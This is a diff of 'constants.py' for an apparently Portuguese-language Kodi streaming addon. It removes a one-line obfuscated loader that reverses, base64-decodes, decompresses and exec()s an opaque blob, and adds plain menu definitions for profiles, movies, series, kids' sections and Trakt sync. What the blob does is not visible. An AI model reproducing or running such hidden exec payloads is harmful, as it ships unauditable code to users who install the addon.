@@ -1,1 +1,242 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# -*- coding: utf-8 -*-
+
+# constants.py
+import os
+
+# Sem xbmcaddon.Addon() aqui — usa path relativo ao __file__
+_HERE = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+ICON_PATH = os.path.join(_HERE, 'resources', 'medias', 'icons')
+
+
+# === MENU PERFIS ===
+PROFILES_MENU = [
+    {'title': 'Selecionar Perfil', 'action': 'profile_select', 'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Gerenciar Perfis',  'action': 'profile_manage', 'icon': os.path.join(ICON_PATH, 'settings.png')},
+    {'title': 'Criar Novo Perfil', 'action': 'profile_create', 'icon': os.path.join(ICON_PATH, 'search.png')},
+]
+
+# ============================================================
+# MENU PRINCIPAL
+# ============================================================
+MAIN_MENU = [
+    {
+        'title': 'Pesquisar',
+        'action': 'search',
+        'icon': os.path.join(ICON_PATH, 'pesquisar.png'),
+        'plot': 'Pesquisar filmes e series por titulo.'
+    },
+    {
+        'title': 'Filmes',
+        'action': 'movies_menu',
+        'icon': os.path.join(ICON_PATH, 'filmes.png'),
+        'plot': 'Filmes do catalogo local.'
+    },
+    {
+        'title': 'Series',
+        'action': 'tvshows_menu',
+        'icon': os.path.join(ICON_PATH, 'series.png'),
+        'plot': 'Series do catalogo local.'
+    },
+    {
+        'title': 'Watchlist',
+        'action': 'show_watchlist_menu',
+        'icon': os.path.join(ICON_PATH, 'em_andamento.png'),
+        'plot': 'Filmes e séries que você quer assistir.',
+    },
+    {
+        'title': 'Minha Lista',
+        'action': 'favorites_menu',
+        'icon': os.path.join(ICON_PATH, 'minha_lista.png'),
+        'plot': 'Seus favoritos salvos localmente.',
+    },
+    {
+        'title': '[COLOR cyan]Minha Conta[/COLOR]',
+        'action': 'account_menu',
+        'icon': 'DefaultUser.png',  
+        'plot': 'Perfis, Trakt e configurações.'
+    },
+    {
+        'title': '[COLOR cyan]Ajustes[/COLOR]',
+        'action': 'open_settings',
+        'icon': 'DefaultAddonProgram.png',
+        'plot': 'Ajustar preferências do addon.',
+    },
+    {    'title': '[COLOR cyan]Fontes[/COLOR]',         
+         'action': 'open_burst_settings', 
+         'icon': 'DefaultAddon.png',  
+         'plot': 'Abrir configurações do Burst.',
+    },
+
+]
+
+# === MENU PRINCIPAL INFANTIL ===
+MAIN_MENU_KIDS = [
+    {
+        'title': 'Pesquisar',
+        'action': 'search',
+        'icon': os.path.join(ICON_PATH, 'kids_search.png'),
+        'plot': 'Pesquisar filmes e series por titulo.'
+    },
+    {
+        'title': 'Filmes',
+        'action': 'movies_menu',
+        'icon': os.path.join(ICON_PATH, 'kids_movie.png'),
+        'plot': 'Filmes infantis e familiares.'
+    },
+    {
+        'title': 'Series',
+        'action': 'tvshows_menu',
+        'icon': os.path.join(ICON_PATH, 'kids_tv.png'),
+        'plot': 'Series infantis e desenhos animados.'
+    },
+    {
+        'title': 'Minha Lista',
+        'action': 'favorites_menu',
+        'icon': os.path.join(ICON_PATH, 'kids_list.png'),
+        'plot': 'Seus favoritos e itens salvos.'
+    },
+    {
+        'title': 'Minha Conta',
+        'action': 'account_menu',
+        'icon': os.path.join(ICON_PATH, 'minha_conta.png'),
+        'plot': 'Perfis e configurações.',
+    },
+]
+
+# ============================================================
+# MENU CONTA
+# ============================================================
+ACCOUNT_MENU = [
+    {
+        'title': 'Perfis',
+        'action': 'profile_select',
+        'icon': os.path.join(ICON_PATH, 'perfil.png'),
+        'plot': 'Trocar ou gerenciar perfis.',
+    },
+    {
+        'title': 'Trakt',
+        'action': 'trakt_main_menu',
+        'icon': os.path.join(ICON_PATH, 'trakt_menu.png'),
+        'plot': 'Sincronizar histórico, watchlist e coleção com o Trakt.',
+    },
+    {
+        'title': 'Histórico',
+        'action': 'show_history_menu',
+        'icon': os.path.join(ICON_PATH, 'historico.png'),
+        'plot': 'Tudo que você já assistiu, com progresso salvo.',
+    },
+    {
+        'title': '[COLOR orange]Ferramentas[/COLOR]',
+        'action': 'tools_menu',
+        'icon': os.path.join(ICON_PATH, 'ferramentas.png'),
+        'plot': 'Configuracoes, manutencao e informacoes do addon.',
+    },
+]
+
+# ============================================================
+# FERRAMENTAS
+# ============================================================
+
+TOOLS_MENU = [
+    {'title': 'Changelog',                'action': 'show_changelog',      'icon': 'DefaultAddon.png',},
+    {'title': 'Biblioteca',               'action': 'library_menu',        'icon': 'DefaultFolder.png', 'plot': 'Conteúdo salvo e organizado localmente.',},
+    {'title': 'Atualizar Banco de Dados', 'action': 'run_indexer',         'icon': 'DefaultAddon.png',  'plot': 'Atualiza e reorganiza o banco de dados local.',},
+]
+
+# ============================================================
+# MENU FILMES
+# ============================================================
+MOVIES_MENU = [
+    {'title': 'Mais Buscados', 'action': 'list_most_searched_movies',        'icon': os.path.join(ICON_PATH, 'most_searched.png'), 'plot': 'Filmes mais buscados no momento.'},
+    {'title': 'Em Alta',       'action': 'list_trending_movies',             'icon': os.path.join(ICON_PATH, 'trending.png'), 'plot': 'Filmes em alta no momento, com mais acessos recentes.'},
+    {'title': 'Populares',     'action': 'list_movies_by_popularity',        'icon': os.path.join(ICON_PATH, 'most_popular.png'), 'plot': 'Filmes mais populares do catalogo local.'},
+    {'title': 'Recentes',      'action': 'list_recently_added_movies',       'icon': os.path.join(ICON_PATH, 'recent.png'), 'plot': 'Filmes adicionados recentemente ao catalogo local.'},
+    {'title': 'Em Andamento',  'action': 'list_history_movies_in_progress',  'icon': os.path.join(ICON_PATH, 'em_andamento.png'), 'plot': 'Filmes que você começou a assistir mas ainda não terminou.'},
+    {'title': '[COLOR cyan]Explorar[/COLOR]',      'action': 'movies_explore_menu',              'icon': os.path.join(ICON_PATH, 'genres.png'), 'plot': 'Explore por mais categorias unicas, como gêneros, temas, coleções e mais.'},
+]
+
+# === SUBMENU EXPLORAR FILMES ===
+MOVIES_EXPLORE_MENU = [
+    {'title': 'Para Você',     'action': 'list_recommendations_movies',    'icon': os.path.join(ICON_PATH, 'for_you.png'), 'plot': 'Recomendações personalizadas com base no seu histórico e preferências.'},
+    {'title': 'Bem Avaliados', 'action': 'list_top_rated_movies',          'icon': os.path.join(ICON_PATH, 'top.png'), 'plot': 'Filmes com as melhores avaliações no catalogo local.'},
+    {'title': 'Gêneros',       'action': 'list_genres',                    'icon': os.path.join(ICON_PATH, 'genres.png'), 'plot': 'Explore por gêneros, como ação, comédia, terror e mais.'},
+    {'title': 'Por Ano',       'action': 'list_years',                     'icon': os.path.join(ICON_PATH, 'years.png'), 'plot': 'Explore por ano de lançamento.'},
+    {'title': 'Tags',          'action': 'list_movie_themes',              'icon': os.path.join(ICON_PATH, 'tags.png'), 'plot': 'Explore por temas e características, como "baseado em livro", "filme de época", "cult" e mais.'},
+    {'title': 'Provedores',    'action': 'list_movie_providers',           'icon': os.path.join(ICON_PATH, 'providers.png'), 'plot': 'Explore por provedores de conteúdo.'},
+    {'title': 'Coleções',      'action': 'list_collections',               'icon': os.path.join(ICON_PATH, 'set.png'), 'plot': 'Explore por coleções, como trilogias, sagas e séries de filmes relacionados.'},
+]
+
+# ============================================================
+# MENU SERIES
+# ============================================================
+TVSHOWS_MENU = [
+    {'title': 'Mais Buscadas','action': 'list_most_searched_shows',         'icon': os.path.join(ICON_PATH, 'most_searched.png'), 'plot': 'Séries mais buscadas no momento.'},
+    {'title': 'Em Alta',      'action': 'list_trending_tvshows',            'icon': os.path.join(ICON_PATH, 'trending.png'), 'plot': 'Séries em alta no momento, com mais acessos recentes.'},
+    {'title': 'Populares',    'action': 'list_tvshows_by_popularity',       'icon': os.path.join(ICON_PATH, 'most_popular.png'), 'plot': 'Séries mais populares do catalogo local.'},
+    {'title': 'Recentes',     'action': 'list_recently_added_tvshows',      'icon': os.path.join(ICON_PATH, 'recent.png'), 'plot': 'Séries adicionadas recentemente ao catalogo local.'},
+    {'title': 'Em Andamento', 'action': 'list_history_tvshows_in_progress', 'icon': os.path.join(ICON_PATH, 'em_andamento.png'), 'plot': 'Séries em andamento.'},
+    {'title': '[COLOR cyan]Explorar[/COLOR]',     'action': 'tvshows_explore_menu',             'icon': os.path.join(ICON_PATH, 'genres.png'), 'plot': 'Explore por mais categorias unicas, como gêneros, temas, provedores e mais.'},
+]
+
+# === SUBMENU EXPLORAR SERIES ===
+TVSHOWS_EXPLORE_MENU = [
+    {'title': 'Para Você',    'action': 'list_recommendations_tvshows',     'icon': os.path.join(ICON_PATH, 'for_you.png'), 'plot': 'Séries recomendadas para você.'},
+    {'title': 'Bem Avaliadas', 'action': 'list_top_rated_shows',    'icon': os.path.join(ICON_PATH, 'top.png'), 'plot': 'Séries melhor avaliadas.'},
+    {'title': 'Gêneros',       'action': 'list_tvshows_genres',     'icon': os.path.join(ICON_PATH, 'genres.png'), 'plot': 'Explore por gêneros, como drama, comédia, ficção científica e mais.'},
+    {'title': 'Tags',          'action': 'list_tvshow_themes',      'icon': os.path.join(ICON_PATH, 'tags.png'), 'plot': 'Explore por temas e características, como "baseado em livro", "série de TV", "cult" e mais.'},
+    {'title': 'Provedores',    'action': 'list_providers',          'icon': os.path.join(ICON_PATH, 'providers.png'), 'plot': 'Explore por provedores de conteúdo.'},
+    {'title': 'Animes',        'action': 'list_animes',             'icon': os.path.join(ICON_PATH, 'animes.png'), 'plot': 'Explore séries de anime disponíveis.'},
+]
+
+# === MENU SERIES INFANTIL ===
+TVSHOWS_MENU_KIDS = [
+    {'title': 'Populares', 'action': 'list_tvshows_by_popularity',  'icon': os.path.join(ICON_PATH, 'populares_kids.png'), 'plot': 'Séries mais populares para crianças.'},
+    {'title': 'Recentes',  'action': 'list_recently_added_tvshows', 'icon': os.path.join(ICON_PATH, 'recentes_kids.png'), 'plot': 'Séries adicionadas recentemente para crianças.'},
+    {'title': 'Infantil',  'action': 'list_kids_tvshows',           'icon': os.path.join(ICON_PATH, 'infantil_kids.png'), 'plot': 'Séries específicas para crianças.'},
+]
+
+# === MENU FILMES INFANTIL ===
+MOVIES_MENU_KIDS = [
+    {'title': 'Populares', 'action': 'list_movies_by_popularity',  'icon': os.path.join(ICON_PATH, 'populares_kids.png'), 'plot': 'Filmes mais populares para crianças.'},
+    {'title': 'Recentes',  'action': 'list_recently_added_movies', 'icon': os.path.join(ICON_PATH, 'recentes_kids.png'), 'plot': 'Filmes adicionados recentemente para crianças.'},
+    {'title': 'Gêneros',   'action': 'list_genres',                'icon': os.path.join(ICON_PATH, 'generos_kids.png'), 'plot': 'Explore por gêneros, como ação, comédia, ficção científica e mais.'},
+]
+
+# ============================================================
+# MENU TRAKT
+# ============================================================
+TRAKT_MENU = [
+    {'title': 'Status / Autenticar', 'action': 'trakt_auth',            'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Filmes',              'action': 'trakt_movies_submenu',   'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Series',              'action': 'trakt_tv_submenu',       'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Watchlist',           'action': 'trakt_watchlist_menu',   'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Colecao',             'action': 'trakt_collection_menu',  'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Assistidos',          'action': 'trakt_watched_menu',     'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Minhas Listas',       'action': 'trakt_lists_menu',       'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Sincronizar',         'action': 'trakt_sync_menu',        'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+]
+
+TRAKT_SYNC_MENU = [
+    {'title': 'Sincronizacao Completa', 'action': 'trakt_full_sync',       'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Enviar Trakt',           'action': 'trakt_sync_to_trakt',   'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Importar Trakt',         'action': 'trakt_sync_from_trakt', 'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Limpar Cache',           'action': 'trakt_clear_cache',     'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+]
+
+# === SUBMENU FILMES TRAKT ===
+TRAKT_MOVIES_MENU = [
+    {'title': 'Watchlist',        'action': 'trakt_watchlist_menu',              'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Assistidos',       'action': 'trakt_watched_menu',                'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Coleção',          'action': 'trakt_collection_menu',             'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Recomendações',    'action': 'trakt_movies_personal_recommended', 'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Minhas Listas',    'action': 'trakt_lists_menu',                  'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+]
+
+# === SUBMENU SERIES TRAKT ===
+TRAKT_TV_MENU = [
+    {'title': 'Watchlist',        'action': 'trakt_watchlist_menu',             'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Assistidas',       'action': 'trakt_watched_menu',               'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Coleção',          'action': 'trakt_collection_menu',            'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Recomendações',    'action': 'trakt_tv_personal_recommended',    'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+    {'title': 'Minhas Listas',    'action': 'trakt_lists_menu',                 'icon': os.path.join(ICON_PATH, 'trakt_menu.png')},
+]
